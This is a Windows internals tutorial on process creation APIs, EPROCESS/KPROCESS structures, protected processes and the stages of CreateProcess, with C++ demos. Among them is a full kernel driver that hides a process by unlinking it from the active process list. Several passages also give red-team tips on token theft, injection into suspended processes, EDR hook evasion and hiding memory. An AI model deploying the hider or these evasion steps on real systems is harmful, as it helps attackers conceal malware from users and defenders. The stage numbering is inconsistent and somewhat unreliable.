---
title: "Windows Processes"
date: "2025-08-25"
excerpt: "A detailed look into how the Windows operating system manages processes, including their structure, lifecycle, and core components."
mainCategory: "papers"
tags: ["Windows Internals"]
lang: "en"
---

### Creating a Process

Windows API provides many ways of creating a process, the simplest way is through `CreateProcess`, which attempts to create a process with the same token access as the creating access.
Think like you have different "menus" (API functions) that let you specify what you want and under which "credentials"(access token) you want it delivered, eventually under the hood they all goes to the same kitchen(kernel).

#### CreateProcess

Launches a new program using your own security toke(current user's identity)
Use when you don't need to change who you are.

```cpp
bool sucess = CreateProcess(
	L"C:\\Program Files\\MyApp.exe, //program to run
	L"", //command-line args
	... //other params
);
```

#### POC

[CreateProcessA function documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

[Create processes documentation](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes)

```cpp
#include <windows.h>
#include <iostream>

int main(){
	//required structs
	STARTUPINFO si = { //tell windows how to configure the new process main windows and its standar I/O handles
		sizeof(si)
	};

	PROCESS_INFORMATION pi = {}; //gives you back who you created, after a successful call, its members are filled in by the kernel. It's a handle

	//call CreateProcess
	/*BOOL CreateProcessA(
	[in, optional]      LPCSTR                lpApplicationName,
		[in, out, optional] LPSTR                 lpCommandLine,
		[in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
		[in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
		[in]                BOOL                  bInheritHandles,
		[in]                DWORD                 dwCreationFlags,
		[in, optional]      LPVOID                lpEnvironment,
		[in, optional]      LPCSTR                lpCurrentDirectory,
		[in]                LPSTARTUPINFOA        lpStartupInfo,
		[out]               LPPROCESS_INFORMATION lpProcessInformation
		);*/


	bool ok = CreateProcessW(
		L"C:\\Windows\\System32\\notepad.exe", //lpApplicationName
		nullptr, //lpCommandLine(can be nullptr if only the exe is needed
		nullptr, //lpProcessAttributes
		nullptr, //lpThreadAttributes
		FALSE, //bInheritHandles
		0, //dwCreationFlags (0 = default)
		nullptr, //lpEnvironment(nullptr = inherit yours)
		nullptr, //lpCurrentDirectory(nullptr = inherit yours)
		&si,
		&pi
	);

	if (!ok) {
		std::cerr << "CreateProcess failed, error " << GetLastError() << "\n";
		return 1;
	}

	std::cout << "Launched notepad.exe as your user, PID = " << pi.dwProcessId << "\n";

	//wait for it to exit before the program continues
	WaitForSingleObject(pi.hProcess, INFINITE);

	//clean up handles
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}
```

#### Be Someone Else

Sometimes you want to launch a process as a different user(like run a schedule task or install a software). Windows give you two flavors in `advapi32.dll`
What is a "`token handle`"?
Windows processes run "as" some security token, a kernel object that says "Im Alice, i belong to group X, i have these privileges...". A token handle is just an opaque handle, that points at one of those token objects.

| Function                | What it does                                       | Caller Requirements                                                                     |
| ----------------------- | -------------------------------------------------- | --------------------------------------------------------------------------------------- |
| CreateProcessAsUser     | When you already have a token handle; use it       | You must hold the “Act as part of the OS” or “Replace a process level token” privilege. |
| CreateProcessWithTokenW | Give a token handle and i'll use it.               | Similar privileges to CreateProcessAsUser, but slightly less strict.                    |
| CreateProcessWithLogonW | Give username/password and i'll log in and launch. | No special privileges, but behind the scenes start the Secondary Logon service          |

#### POC CreateProcessAsUser

“Obtain a token via `LogonUser`, then spawn via `CreateProcessAsUser`.”

[CreateProcessAsUserA function documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)

[CreateProcessWithLogonW function documentation](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw)

This is a unreal POC, meaning it's not safe since it hardcodes the username and password. But there is also a version that i use Windows Credential UI that most tools uses and is safe.

```cpp
//“Obtain a token via LogonUser, then spawn via CreateProcessAsUser.”

#include <windows.h>
#include <userenv.h>
#include <iostream>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Userenv.lib")

int main()
{
	LPCWSTR username = L"OtherUser";
	LPCWSTR domain = L"MYDOMAIN"; //nullptr for local account
	LPCWSTR password = L"P@ssword!";

	HANDLE hToken = nullptr; //will receive the new user's token

	//log on and get primary token

	/* https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw */

	BOOL ok = LogonUserW(
		username,
		domain,
		password,
		LOGON32_LOGON_INTERACTIVE,       // typical desktop logon
		LOGON32_PROVIDER_DEFAULT,
		&hToken                           // ← OUT parameter
	);

	if (!ok) {
		std::wcerr << L"LogonUser failed: " << GetLastError() << std::endl;
		return 1;  // can’t continue without a token
	}


	//create a process under that token
	STARTUPINFOW si = {
		sizeof(si)
	};


	//ask windows to start Notepad as that user
	PROCESS_INFORMATION pi = {};
	ok = CreateProcessAsUserW(
		hToken, //received token
		L"C:\\Windows\\System32\\notepad.exe", //program
		nullptr, //cmdline(nullptr = just the exe)
		nullptr, //proc attrs
		nullptr, //thread attrs
		FALSE, //inherit handles
		0, //creation flag
		nullptr, //env block
		nullptr, //cwd
		&si,&pi);

	if (!ok) {
		std::wcerr << L"CreateProcessAsUserW failed: " << GetLastError() << L"\n";
		CloseHandle(hToken);
		return 1;
	}

	std::wcout << L"Launched Notepads as " << username << L", PID = " << pi.dwProcessId << std::endl;


	//clean up
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hToken);
	return 0;
}

```

#### cred_launch.cpp

```cpp
#include <windows.h>|
#include <iostream>
#include <wincred.h>
#include <userenv.h>
#include <strsafe.h>
#include <string>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Credui.lib")


//Show CredUI, return user/domain/password in std::wstrings
bool PromptForCredentials(
    std::wstring& user,
    std::wstring& domain,
    std::wstring& password
)
{
    //structure used to pass infromation to the CredUIPromptForCredentials function that creadtes a dialog box used to obtain credentials information
    CREDUI_INFOW ui{};
    ui.cbSize = sizeof(ui);
    ui.pszCaptionText = L"Run as..";
    ui.pszMessageText = L"Credentials to launch target process";


    //CredUIParseUserName
    /* https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsw */
    WCHAR usr[CREDUI_MAX_USERNAME_LENGTH + 1] = {}; //save the username?
    WCHAR pwd[CREDUI_MAX_PASSWORD_LENGTH + 1] = {}; //save the password?
    BOOL save = FALSE;
    DWORD flags = CREDUI_FLAGS_DO_NOT_PERSIST | CREDUI_FLAGS_EXCLUDE_CERTIFICATES;


    // function creates and displays a configurable dialog box that accepts credentials information from a user.
    DWORD res = CredUIPromptForCredentialsW(
        &ui, //pointer to CREDUI_INFO strucutre(info for customizing the apperance of the dialog box)
        L"", //target name (blank = generic)
        nullptr, //reserved
        0, //auth error (0 = none)
        usr, ARRAYSIZE(usr),
        pwd, ARRAYSIZE(pwd),
        &save,
        flags);


    if (res != ERROR_SUCCESS) //used clicked Cancel or Error
        return false;
    //CredUI always return DOMAIN\user or .\user - split it:

    WCHAR parsedUser[CREDUI_MAX_USERNAME_LENGTH + 1] = {};
    WCHAR parsedDomain[CREDUI_MAX_USERNAME_LENGTH + 1] = {};


    /* https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduiparseusernamew */
    //The CredUIParseUserName function extracts the domain and user account name from a fully qualified user name.
    CredUIParseUserNameW(usr,
        parsedUser, ARRAYSIZE(parsedUser),
        parsedDomain, ARRAYSIZE(parsedDomain));

    user.assign(parsedUser);
    domain.assign(parsedDomain);
    password.assign(pwd);

    SecureZeroMemory(usr, sizeof(usr));   // scrub originals
    SecureZeroMemory(pwd, sizeof(pwd));
    return true;

}

int wmain()
{
    //collect credentials
    std::wstring user, domain, password;
    if (!PromptForCredentials(user, domain, password))
    {
        std::wcout << L"Aborted by user.\n";
        return 0;
    }

    //exchange creds for a primary access token
    /* https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw */
    HANDLE hToken = nullptr;
    if (!LogonUserW(
        user.c_str(),
        domain.c_str(),
        password.c_str(),
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        &hToken
    ))
    {
        std::wcerr << L"LogonUser failed: " << GetLastError() << L"\n";
        return 1;
    }

    //child-process settings(default)
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};

    //launch notepad as the captured user
    if (!CreateProcessAsUserW(
        hToken,
        L"C:\\Windows\\System32\\notepad.exe",   // payload EXE
        nullptr,                                 // full cmd-line (none)
        nullptr, nullptr,                        // default security
        FALSE,                                   // no handle inherit
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        nullptr,                                 // inherit our env
        nullptr,                                 // inherit our cwd
        &si, &pi))
    {
        std::wcerr << L"CreateProcessAsUser failed: "
            << GetLastError() << L"\n";
        CloseHandle(hToken);
        return 1;
    }

    std::wcout << L"Launched PID " << pi.dwProcessId
        << L" under " << domain << L"\\" << user << L"\n";

    //house-keeping
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hToken);
    return 0;
}

/*
┌─────────────────┐
│ CredUI dialog   │  ← user types DOMAIN\Bob + [password]
└──────┬──────────┘
       │ writes into
       ▼
WCHAR usr[514]  ← "DOMAIN\Bob\0"
WCHAR pwd[256]  ← "S3cr3t!\0"

CredUIParseUserNameW splits usr:
   parsedDomain = "DOMAIN"
   parsedUser   = "Bob"

std::wstring domain = L"DOMAIN";
std::wstring user   = L"Bob";
std::wstring pass   = L"S3cr3t!";

LogonUserW( user.c_str(), domain.c_str(), pass.c_str(), … )
        ↓
   → primary token
CreateProcessAsUserW( token, … )  → Notepad running as DOMAIN\Bob


*/
```

### Shell Shortcut: ShellExecute[Ex]

If you hand a document like ("`report.docx`"), it:
Look up which app handles ".docx" in the registry (word)
Builds a proper command line("winword.exe" "report.docx")
Call **CreateProcess** for you.
Works like asking "Open this file for me", rather than "Run this program"

#### POC ShellExecuteW & ShellExecuteExW

1. Creates a dummy text file (if it doesn’t already exist).
2. Opens it with the user’s default “.txt” handler via ShellExecuteW.
3. Opens it again via ShellExecuteExW so we can grab the PROCESS_INFORMATION for fun (PID, wait, etc.).

```cpp
/*
   shell_poc.cpp
   --------------
   POC: demonstrate ShellExecuteW and ShellExecuteExW.

   1) Creates a dummy text file (if it doesn’t already exist).
   2) Opens it with the user’s default “.txt” handler via ShellExecuteW.
   3) Opens it again via ShellExecuteExW so we can grab the
      PROCESS_INFORMATION for fun (PID, wait, etc.).
*/

#include <windows.h>
#include <shellapi.h>   // ShellExecute / ShellExecuteEx
#include <fstream>
#include <iostream>

#pragma comment(lib, "Shell32.lib")

// Helper: make sure the file exists so the Shell has something to open.
void EnsureDemoFile(const wchar_t* path)
{
    std::ifstream fin(path, std::ios::binary);
    if (!fin.good())
    {
        std::wofstream fout(path, std::ios::binary);
        fout << L"Hello from ShellExecute POC!\r\n";
        std::wcout << L"Created " << path << L"\n";
    }
}

int wmain()
{
    const wchar_t* filePath = L"C:\\Temp\\demo.txt";
    EnsureDemoFile(filePath);


    HINSTANCE hInst = ShellExecuteW(
        nullptr,        // hwnd      no parent window
        L"open",        // lpVerb    "open" is default could be "edit
        filePath,       // lpFile    file or URL
        nullptr,        // lpParameters N/A for a plain doc
        nullptr,        // lpDirectory  current dir for the child
        SW_SHOWNORMAL   // nShowCmd   normal window
    );

    if ((UINT_PTR)hInst <= 32)
    {
        std::wcerr << L"ShellExecuteW failed, code " << (UINT_PTR)hInst << L"\n";
    }
    else
    {
        std::wcout << L"ShellExecuteW succeeded (handle = " << (UINT_PTR)hInst
            << L") – look for the editor window.\n";
    }


    SHELLEXECUTEINFO sei{};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS; // ask the Shell to give us hProcess
    sei.hwnd = nullptr;
    sei.lpVerb = L"open";
    sei.lpFile = filePath;
    sei.nShow = SW_SHOWNORMAL;

    if (ShellExecuteExW(&sei))
    {
        std::wcout << L"ShellExecuteExW launched, PID = "
            << GetProcessId(sei.hProcess) << L"\n";

        //wait for the user to close the editor
        WaitForSingleObject(sei.hProcess, INFINITE);

        std::wcout << L"Editor closed, exit code ";
        DWORD exitCode = 0;
        if (GetExitCodeProcess(sei.hProcess, &exitCode))
            std::wcout << exitCode << L"\n";
        CloseHandle(sei.hProcess);
    }
    else
    {
        std::wcerr << L"ShellExecuteExW failed, error " << GetLastError() << L"\n";
    }

    return 0;
}

```

### Kitchen

No matter which API is used, when it's time to actually spin up the new process, it all funnels into:

1. **CreateProcessInternal**(inside `kernel32.dll/ ntdll.dll`)
2. **NtCreateUserProcess**(in `ntdll.dll`)
3. **NtCreateUserPorcess**(in the `kernel/Executive`)

At this point into kernel mode, and Windows:

- Create the new process object
- Assigns it the chosen security token
- Sets up the address space, initial thread, handles, etc
- Return you a PROCESS handle so it can be controlled or watched.

* **CreateProcess** = “Run this EXE as me.”
* **…AsUser / WithTokenW / WithLogonW** = “Run it as somebody else; here’s how to get their token.”
* **ShellExecute** = “Open this file however Windows usually does.”
* **Under the hood** → everyone ends up in **NtCreateUserProcess**, which switches into kernel mode to finish the job.

#### CreateProcess\* functions arguments

- **Who runs it?** - token / credentials
- **What to run?** - exe path + command line
- **Lock it down?** - security attributes
- **Share my toys?** - handle inheritance flag
- **Special launch rules?** - creation flags
- **What’s in its room?** - environment + current dir
- **Window & extras?** - STARTUPINFO/EX
- **Receipt of birth** - PROCESS_INFORMATION handles & IDs

## EPROCESS

Additional information necessary for the overall management of a process.

### Process Internals

Each running program in Windows is like a little universe of its own, at level Kernel, Windows keeps track of all these universes in a giant table of "process books" one for each process called an `EPROCESS`.
Inside `EPROCESS` you will find everything the OS needs to manage, secure, schedule, and inspect that process.

#### Finding the Process

- ActiveProcessLinks
  All EPROCESS blocks are tied together in a doubly-linked list, anchored at PsActiveProcessHead(Anchor point for a big, doubly-linked list of all the live processes in the system, each time Windows creates a new process, it allocated an EPROCESS block for it and stick this block into this list).
  It's possible to unlink the process from that list, doing so, it hide from tools like Task Manager.
  But for that we would need to write a Kernel Driver, because EPROCESS & PsActiveProcessHead live in ring-0(kernel memory), so user-mode code (normal executables) cannot read or write code in kernel, and furthermore there is no official Win32 API that hides the process, only a driver running in ring-0 can.
  Realistically speaking, Windows enforces driver signature, meaning only tursted-signed .sys load.
  There is a test-signing mode on a lab VM we could to try these self-signed drivers.
  PatchGuard will detect unauthorized kernel modifications like EPROCESS unlinking.

```cpp
/*
 * PoC Kernel Driver: Process Hider
 *
 * This driver unlinks a target process's EPROCESS from PsActiveProcessHead
 * so it will not appear in Task Manager or other standard process enumerations.
 *
 * Build with Windows Driver Kit (WDK). Replace the hardcoded PID in DriverEntry
 * with the PID of a test process (notepad.exe) before loading.
 *
 * Usage:
 * 1. Compile and sign the driver accordingly for your test machine.
 * 2. sc create HiderDriver type= kernel binPath= "\\??\\C:\\Drivers\\HiderDriver.sys"
 * 3. sc start HiderDriver
 * 4. Observe that the target PID is no longer visible.
 * 5. sc stop HiderDriver
 *
 * This is for educational purposes. Modern Windows versions with PatchGuard
 * may detect unauthorized modifications. Run in a test VM.
 */

#include <ntddk.h>

VOID HideProcess(PEPROCESS Process)
{
    PLIST_ENTRY list = &Process->ActiveProcessLinks;
    PLIST_ENTRY prev = list->Blink;
    PLIST_ENTRY next = list->Flink;

    //unlink from the active process list
    prev->Flink = next;
    next->Blink = prev;

    //self-link to prevent accidental dereference issues
    list->Flink = list;
    list->Blink = list;
}

NTSTATUS HideProcessByPid(HANDLE pid)
{
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId(pid, &target);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Hider] PsLookupProcessByProcessId(0x%p) failed: 0x%X\n", pid, status);
        return status;
    }

    HideProcess(target);
    ObDereferenceObject(target);
    DbgPrint("[Hider] Process 0x%p unlinked\n", pid);
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("[Hider] Driver unloaded\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[Hider] Driver loaded\n");

    //change this to the PID you want to hide
    HANDLE pidToHide = (HANDLE)1234;
    HideProcessByPid(pidToHide);

    return STATUS_SUCCESS;
}

```

#### Identifiers & Metadata

- **UniqueProcessId(PID) && ParentProcessId(PPID)**
  Numeric ID that is visible in tools like Task Manger, is a unique identifier of the process.
  PID spoofing or PPID manipulation is possible.
- **ImageFileName / ImageBaseAddress / SectionObject**
  **ImageFileName**: On-disk EXE name (notepad.exe)
  **ImageBaseAdddress**: Where the EXE code is mapped in the process virtual memory.
  **SectionObject**: The kernel's handle to that mapped image, how Windows enforces code pages
- **ProcessFlags / Creation & Exit times**
  Flags indicate system/user process, breakpoints, heap-type, etc
  Timestamps tell exactly when the process was born and died, is possible to set fake creation times("living off the land") to evade-time based detection.

Simple POC, that uses NtQuerySystemInformation(or Win32 snapshot APIs) to dump:

- **PID & PPID**
- **Image name**
- **Base address of the main code**
- **Creation time**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>

int main(void)
{

	//size of structure, without this it will fail
	/* https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32 */
	PROCESSENTRY32 pe = {
		sizeof(pe)
	};

	//takes snapshot of all process in the system, TH32CS_SNAPPROCESS tells it to capute process information only
	/* https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes */
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 1;
	}

	if (Process32First(snap, &pe)) { //fills PROCESSENTRY32 with data for the first process in the snapshot
		do {
			printf("PID=%5lu PPID=%5lu Name=%-20ls", pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);


			//Open process to query its first module base
			//Opens handle to target process with rights to query info and read its memory
			/*https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess */

			HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
			if (h) {
				//retriteve module information from another process
				/* https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules */
				HMODULE mods[1];
				DWORD  cbNeeded;
				if (EnumProcessModules(h, mods, sizeof(mods), &cbNeeded)) {
					MODULEINFO mi;
					if (GetModuleInformation(h, mods[0], &mi, sizeof(mi))) {
						printf("Base=0x%p ", mi.lpBaseOfDll);
					}
				}

				//creation time
				//GetProcessTime retrieves creation(ct), exit(et), kernel(kt), and user(ut) time for the process
				/* https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocesstimes */
				FILETIME ct, et, kt, ut;
					if (GetProcessTimes(h, &ct, &et, &kt, &ut)) {
						ULARGE_INTEGER t;
						t.LowPart = ct.dwLowDateTime;
						t.HighPart = ct.dwHighDateTime;
						printf("CT= %llu", t.QuadPart);
				}
				CloseHandle(h);
			}
			printf("\n");
			//advances to the next process entry until no more remain
		} while (Process32Next(snap, &pe));
	}
	CloseHandle(snap);
	return 0;
}


```

Module = one loaded PE file(EXE or DLL) in a process
HMODULE = handle == base address of that loaded image
MODULEINFO= metada about that image(size, entrypoint, etc)

#### Security & Privilege

- **PrimaryAccessToken → TOKEN**  
   Every process carries a “token” that says who you are (user, groups, privileges).
  - **Privilege escalation:** You can **steal** or **duplicate** another process’s token (e.g. SYSTEM) to run with higher rights.
  - **Detection:** Look for unexpected token duplicates with Sysinternals or WinDbg’s `!token` command.
- **Job this Process Belongs to → EJOB**  
   Jobs can constrain CPU/memory and even block process creation. Some sandbox tools wrap malware in a job object.
- **Security/Exception/Debug Ports**  
   Channels used by debuggers, the kernel exception dispatcher, or SEH. Malware sometimes tampers here to prevent debugging.

#### User-mode View: the PEB

- **Process Environment Block (PEB) → PEB**  
   Lives in user-mode memory. Contains pointers to:
  - **Loader data** (the list of loaded DLLs)
  - **Command-line arguments**
  - **Environment variables**
  - **Image path** again
  - **Tip:** PEB fields are a favorite for rootkits to hook (e.g. hide loaded DLLs or alter the command-line that forensic scanners see).

#### Threads & Execution

- **ThreadListHead → ETHREAD → ETHREAD…**  
   Each process has one or more kernel thread objects. You create threads to inject code or execute payloads.
  - **Tip:** Unlinking an ETHREAD object hides threads from debuggers and forensic thread-enumeration tools.
- **KPROCESS** (inside the EPROCESS)  
   The scheduler’s view of your process: priority, CPU affinity, time slices. You can tweak this to hide CPU spikes or disable interrupts.

#### Windows-Subsystem Extras

- **W32PROCESS**  
   Created when you call any USER/GDI API (e.g. `CreateWindow`), tracks GUI objects and hooks into `win32k.sys`.
  - **Evasion:** Headless malware can avoid loading User32 to stay under the radar.
- **EWOW64PROCESS** (on 64-bit systems)  
   Tracks Wow64 (32-bit) processes.
  - Red-teamers can abuse the Wow64 transition helpers to smuggle 32-bit shellcode inside a 64-bit host.
- **DXGPROCESS / Protection Level & Signature**  
   Related to DirectX & code integrity on Win10. Generally not targeted by most malware—but advanced runners use DXGPROCESS counters to detect GPU virtualization or sandboxes.

## KPROCESS

Used by Windows kernel to manage the execution of a process at the kernel level.
Under the hood every Windows process is represented by EPROCESS object in kernel memory, the very first thing inside a EPROCESS is a KPROCESS sub-object(sometimes called "pcb").

This is all about scheduling, timing, and the process’s own page tables.

> **Why you care**:
>
> - **CR3** is what you spoof if you want your injected code to run with a different view of memory.
> - **ThreadListHead** is how you’ll find every thread to suspend, resume, or patch.
> - **Time fields** can give away hidden threads doing work in the background (high cycle counts).
> - **Affinity/Priority** tweaks can help you hide behind legit processes.

#### The “outer” EPROCESS fields

Once you step past the KPROCESS (at offset +0x000 … +0x2d8), you get process-specific data:

- **Token**  
   The security token gives you the user’s SID, privileges, and groups. If you patch or steal this, you can elevate or impersonate.
- **ImageFileName**  
   A fixed length (15-character) name of the EXE. Handy for identifying a process in a dump.
- **SectionObject**  
   The control section for the process image. Malware loaders will fiddle with this to remap or unmap images.
- **Peb**  
   Pointer to the user‐mode Process Environment Block. From there you get the full command line, environment, loaded DLL list, etc.
- **VadRoot** (or VadRootWhatever)  
   A balanced tree of all user-mode memory allocations (VAD = Virtual Address Descriptors). Kernel rootkits will tamper with this to hide injected code pages.

#### Red-team workflow

- **Locate your target EPROCESS** by PID or by walking `PsActiveProcessHead`.
- **Peek KPROCESS.DirectoryTableBase** if you need to read/write memory in the context of that process (set CR3).
- **Walk ThreadListHead** to find threads and suspend or hijack them.

- **Inspect Token** if you want to duplicate or steal privileges.

- **Unlink ActiveProcessLinks** and/or **patch VadRoot** to hide your process or injected memory regions.

- **Hook InstrumentationCallback** or **modify ProcessFlags** (e.g. clear the “can be debugged” bit) to evade user-mode or kernel-mode detection hooks.

- **KPROCESS** = “how Windows schedules and accounts time for this process” (threads, CR3, times, priority).
- **EPROCESS** = “all the rest of the process’s state” (PID, handles, security token, image, PEB, memory map, debug port).

## Protected Processes

By default any admin(process holding the `SeDebugPrivilege` token) can reach into any other user-mode process and do pretty much anything, read/write its memory, suspend its thread, inject code.
Originally created to protect DRM media stream.

Windows Vista introduced the "protected processes" they are still user-mode processes but with extra kernel checks that restrict even an admin from poking at them in most ways.

To request "protected" status, a processes's executable must be signed with a special Microsoft "media" format, most of the real work happens in the kernel process creation path, special flags get set in the new processes `EPROCESS` structure before even starts running.

Once a process is marked as "protected", Windows kernel will deny nearly all standard access rights.

- **Allowed**:
  - `PROCESS_QUERY_LIMITED_INFORMATION` (basic stats)
  - `PROCESS_SET_LIMITED_INFORMATION` (tweak basic resource limits)
  - `PROCESS_TERMINATE`(kill the process)
  - `PROCESS_SUSPEND_RESUME`(freeze or thaw its threads)
- **Denied**:
  - Reading or writing arbitrary memory.
  - Injecting code or DLL
  - Enumerate internal handles or threads, beyond the limited info

System Process that are Protected:

- **Audio Device Graph (Audiodg.exe):** decodes protected audio streams
- **Media Foundation Pipeline (Mfpmp.exe):** handles other high-value media flows
- **Windows Error Reporting (WerFaultSecure.exe):** can inspect protected processes if one crashes
- **System process:** holds kernel handles and stores some decryption keys in user-mode memory

Tools like Process Explorer or most user-mode debuggers will be unable to inspect or tamper with these protected processes. You’ll see truncated information or “access denied” errors.

If you’re designing malware that needs to hook or hook-inject into another process, you can’t target a protected process from user mode—your payload simply won’t attach.

## Protected Process Light (PPL)

Now besides keeping media stream safe, this is about protecting Windows Store apps, code integrity, licensing services, all has the same "even admin can't poke me". Now it has a "trust level" tag so some system services get a bit less locked-down that core media engines, but still off-limits to user-mode snooping.

Unlike protected processes, PPLs have ranked signer levels that grant or deny specific rights(some can't even be terminated)

#### Signer Level & Trust Tiers

Every PPL gets two flags in its **`EPROCESS`**:
**`Protection Level:`** "ProtectedLight", "Protected"
**`Signer`**: Who signed, Windows, TCB, Antimalware

#### DLL Integrity

**SignatureLevel vs. SectionSignatureLevel:** PPL checks that every DLL you load is signed at least as “high” as your process.
Even if you trick a protected process into loading a malicious DLL file, Code Integrity will refuse it unless that DLL carries equal or higher trust.

## Flow of CreateProcess

Takes CreateProcess parameters(path, flags like CREATE_SUSPENDED, attributes, environment, etc) and make sure they are all fine. It translates higher-level flags("start minimized") into the kernel's native form.

**Stage 1**
Internally it does an **`NtCreateSection`** on the **`.exe`** file, then maps that section into the new process's virtual memory address space with **`NtMapViewOfSection`**.

If you call the lower‐level APIs (NtCreateProcessEx, NtCreateSection, etc.) directly, you can skip a lot of the overhead here—Windows didn’t design those NT APIs for public consumption, but they let you go straight to the “good stuff” and avoid triggering some user-mode hooks.

**Stage 2**
This is where the raw bytes of the EXE land in memory, if you're doing reflective PE injection or any form of in-memory "loading" of a payload, you are re implementing part of this stage, allocating a block in the target VA space and copying your PE headers + sections in.

**Stage 3**
The kernel creates an executive process object (`EPROCESS`), which holds all the bookkeeping: handle tables, VADs (virtual address descriptors), security context, job associations, etc.

It then creates a thread object (`ETHREAD`), allocates its stack and context structure, but doesn’t yet let it run.

If you ask for `CREATE_SUSPENDED`, Windows stops right here. You can then inject your shellcode, patch the entry point, or hijack the startup thread before it ever executes a single instruction of the legit program.

Again, if you call `NtCreateThreadEx` from your own code in the target, you can inject without leaving traces in Kernel32.dll’s import table that AV/EDR hooks often monitor.

**Stage 4**
Creation of a “pure” executive process/object is one thing; making it a **Windows GUI/console process** is another. The Client-side runtime (Kernel32) talks to `Csrss.exe` (“Win32 subsystem”) over an LPC port to:

- Build the PEB (Process Environment Block)
- Create the thread’s TEB (Thread Environment Block)
- Flood in GUI/shared-heap structures, console buffers, etc.
  If you want a “bare” process (no windowing, no subsystem), you could launch it as a native image or use direct NT calls to never touch CSRSS, reducing your footprint.

**Stage 5**
Unless you asked for `CREATE_SUSPENDED`, it resumes that initial thread. At this point it starts executing at ntdll’s loader stub, which eventually jumps into your EXE’s entry point.
This is the moment AV/EDR sees the new process “come alive.” If you’ve already patched the entry point or implanted run-on-load hooks in the section from Stage 2, your code fires here.

**Stage 6**
Now running in the _context_ of the new process, the loader:

1. Walks the Import Address Table → `LoadLibrary` each DLL you link against
2. Calls their `DllMain(DLL_PROCESS_ATTACH)` callbacks
3. Processes TLS callbacks, resource initialization, etc.
4. Finally jumps to your `main` / `WinMain` / whichever entry point you asked for.

- **IAT hooks / shim injection:** If you can tamper with the import table before or during this step, you’ll get your hooks in every subsequent API call.
- **PE loader callbacks:** Some red-team frameworks register shadow TLS callbacks to execute very early.

- **Stage 1 (Validate)** → Hackers rarely touch this; go direct to NT APIs to dodge user-mode hooks.
- **Stage 2 (Section Object)** → Reimplement with in-memory PE mapping (reflective injectors).
- **Stage 3/4 (Proc & Thread)** → Use `CREATE_SUSPENDED` or `NtCreateThreadEx` to inject before anything runs.
- **Stage 5 (CSRSS)** → Avoid or minimize talking to CSRSS if you want stealth; it’s heavily monitored.
- **Stage 6 (Resume)** → Triggers detection; prep your code by now.
- **Stage 7 (Loader inside)** → IAT hooks, TLS callbacks, delay-load tricks—your last big chance to seed persistence in the target’s import chain.

## Flow of CreateProcess

### Main Notes

This is the where and how the previous data structures are filled out, also the overall creation and termination behind those process.

Windows process creation consists in three main stages, first the client side the Windows library Kernel32.dll starting with `CreateProcessInternalW`, the Windows Executive and the Windows subsystem process (csrss).

Following list summarizes the main stages of creating a process with Windows CreateProcess\* functions:

1. Validate and convert parameters and flags to their native counter parts
2. Open the EXE to be execute inside the process
3. Create the Windows executive process object
4. Create initial thread
5. Post creation windows subsystem specific process initialization
6. Execution of initial thread
7. Execution of program's entry point

**Stage 1: Validate and convert parameters and flags to their native counter parts**
Where Windows take the raw flags and parameters inserted in the `CreateProcessInternalW` and turns them into precise settings the kernel needs to start the new process.

**Priority Class**
The priority class for the new process is specified as independent in the `CreationFlags` parameter in the CreateProcess\* function,the bits inserted into `CreationFlags` chooses the low priority class you requested, meaning if accidentally or intentionally bitwise-OR more than one priority class in the CreationFlag, it will look at the classes and pick the one with the lowest base priority.

**Debugger**
If passed the debug flag, Kernel32 hooks into ntdlls debug subsystem so the debugger can receive process events.

Convert attributes list
High level list like parent-process list, CPU affinity, security capabilities are translated into kernels native format.

**Stage 2: Opening the image to be executed**
At this point the thread has switch into kernel mode and continues the work with `NtCreateUserProcess` system call implementation.

First validates arguments(prevent hack or malicious arguments), it builds an internal structure to hold the creation information

Then next stage in `NtCreateUserProcess` is to find the appropriate Windows image to run the executable file specified by the caller.
Locate the file the user asked, create a section object(kernel container to map the content of this file into the process new memory)
